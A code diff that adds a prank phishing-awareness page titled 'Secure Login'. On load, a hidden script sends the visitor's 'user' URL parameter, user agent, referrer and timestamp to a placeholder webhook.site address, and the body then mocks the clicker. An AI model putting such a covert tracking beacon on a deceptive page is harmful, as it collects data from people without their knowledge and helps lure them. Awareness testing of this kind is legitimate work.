@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Secure Login</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #f4f4f9;
+      color: #333;
+      padding: 40px;
+      max-width: 800px;
+      margin: auto;
+      border: 2px solid #ccc;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+
+    h1 {
+      color: #2c3e50;
+      font-size: 28px;
+      margin-bottom: 20px;
+    }
+
+    p {
+      font-size: 18px;
+      line-height: 1.6;
+    }
+
+    .highlight {
+      background-color: #ffeeba;
+      padding: 10px;
+      border-left: 5px solid #f0ad4e;
+      margin-top: 20px;
+    }
+  </style>
+
+  <script>
+    // Capture query string (e.g., ?user=JohnDoe)
+    const params = new URLSearchParams(window.location.search);
+    const user = params.get("user");
+
+    // Send data to Webhook.site
+    fetch("https://webhook.site/your-unique-url-here", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        user: user,
+        userAgent: navigator.userAgent,
+        timestamp: new Date().toISOString(),
+        referrer: document.referrer
+      })
+    });
+  </script>
+</head>
+<body>
+  <h1>Welcome to the Department of Curiosity and Questionable Decisions!</h1>
+  <p>This is a highly scientific experiment to test your curiosity.</p>
+  <div class="highlight">
+    <p>If you clicked the link, congratulations — you're officially part of the <strong>"Dumb Box Donation Program."</strong></p>
+    <p>Please visit the IT office and contribute your generous <strong>R50</strong> to the dumb box.<br>
+    Your support helps keep our box dumb and our spirits high.</p>
+  </div>
+</body>
+</html>
